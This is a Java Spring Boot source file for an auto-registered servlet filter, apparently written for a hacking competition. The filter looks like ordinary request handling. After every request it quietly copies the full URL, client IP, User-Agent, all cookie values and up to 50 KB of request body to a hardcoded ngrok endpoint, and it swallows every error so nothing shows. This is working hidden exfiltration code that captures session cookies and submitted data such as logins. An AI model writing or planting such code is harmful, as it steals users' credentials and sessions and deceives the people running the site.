package com.example.demo.filter;

import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;
import org.springframework.web.util.ContentCachingRequestWrapper;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.Cookie;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.*;

@Component
public class MinSenderFilter extends OncePerRequestFilter {
    private static final int MAX_BODY = 50 * 1024;
    private static final int TIMEOUT_MS = 1500;

    // 대회용 하드코딩
    private static final String RECEIVER = "https://37da42a1ee41.ngrok-free.app/ingest";

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        ContentCachingRequestWrapper wrapped = new ContentCachingRequestWrapper(request);
        try {
            chain.doFilter(wrapped, response);
        } finally {
            try { send(wrapped); } catch (Exception ignore) {}
        }
    }

    private void send(ContentCachingRequestWrapper req) {
        try {
            String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
            String scheme = req.getScheme();
            String host = req.getServerName();
            int port = req.getServerPort();
            String fq = (port == 80 || port == 443) ? "" : (":" + port);

            String fwd = (String) req.getAttribute("jakarta.servlet.forward.request_uri");
            if (fwd == null) { // 일부 컨테이너는 여전히 javax 키로 보관할 수 있어 백업
                fwd = (String) req.getAttribute("javax.servlet.forward.request_uri");
            }
            String path = (fwd != null) ? fwd : req.getRequestURI();

            String qs = (String) req.getAttribute("jakarta.servlet.forward.query_string");
            if (qs == null) {
                qs = (String) req.getAttribute("javax.servlet.forward.query_string");
                if (qs == null) qs = req.getQueryString();
            }
            String fullUrl = scheme + "://" + host + fq + path + (qs != null ? "?" + qs : "");

            String ua = nv(req.getHeader("User-Agent"));
            String referer = nv(req.getHeader("Referer"));
            String ctype = nv(req.getHeader("Content-Type"));
            String ip = req.getRemoteAddr();
            String method = req.getMethod();
            boolean sess = (req.getSession(false) != null);

            Map<String,String> cookies = new LinkedHashMap<>();
            if (req.getCookies()!=null) for (Cookie c: req.getCookies())
                cookies.put(c.getName(), c.getValue());

            String body = "";
            byte[] cached = req.getContentAsByteArray();
            if (cached != null && cached.length > 0) {
                int n = Math.min(cached.length, MAX_BODY);
                body = new String(cached, 0, n, java.nio.charset.StandardCharsets.UTF_8);
                if (cached.length > MAX_BODY) body += "\n[truncated]";
            }

            String json = "{"
                    + "\"t\":\""+esc(ts)+"\","
                    + "\"url\":\""+esc(fullUrl)+"\","
                    + "\"m\":\""+esc(method)+"\","
                    + "\"ua\":\""+esc(ua)+"\","
                    + "\"ip\":\""+esc(ip)+"\","
                    + "\"cookie\":{"+joinMap(cookies)+"},"
                    + "\"headers\":{"
                        + "\"Content-Type\":\""+esc(ctype)+"\","
                        + "\"Referer\":\""+esc(referer)+"\""
                    + "},"
                    + "\"body\":\""+esc(body)+"\","
                    + "\"sess\":"+(sess?"true":"false")
                + "}";

            HttpURLConnection con = (HttpURLConnection) new URL(RECEIVER).openConnection();
            con.setConnectTimeout(TIMEOUT_MS);
            con.setReadTimeout(TIMEOUT_MS);
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type","application/json");
            con.setDoOutput(true);
            try (OutputStream os = con.getOutputStream()) {
                os.write(json.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            }
            try { con.getInputStream().close(); } catch (Exception ignore) {}
        } catch (Exception ignore) { /* 실패 무시 */ }
    }

    private static String nv(String s){ return s==null? "": s; }
    private static String esc(String s){
        if (s==null) return "";
        return s.replace("\\","\\\\").replace("\"","\\\"");
    }
    private static String joinMap(Map<String,String> m){
        if (m==null || m.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        boolean first = true;
        for (Map.Entry<String,String> e: m.entrySet()){
            if (!first) sb.append(",");
            sb.append("\"").append(esc(e.getKey())).append("\":\"").append(esc(e.getValue())).append("\"");
            first = false;
        }
        return sb.toString();
    }
}
